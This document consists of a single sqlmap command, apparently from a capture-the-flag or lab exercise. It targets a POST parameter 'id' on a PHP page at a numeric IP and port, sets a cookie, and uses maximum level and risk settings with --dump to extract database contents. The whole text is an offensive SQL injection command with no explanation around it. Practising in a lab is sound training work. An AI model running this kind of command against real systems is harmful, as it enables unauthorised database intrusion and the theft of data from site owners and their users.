___

```bash
sqlmap -u "http://83.136.254.47:49729/case2.php" --data='id=1' --method POST --cookie="cookie=XSSisFun" --level 5 --risk 3 -p id --batch --threads 10 --dbms=mysql --dump dbms
```


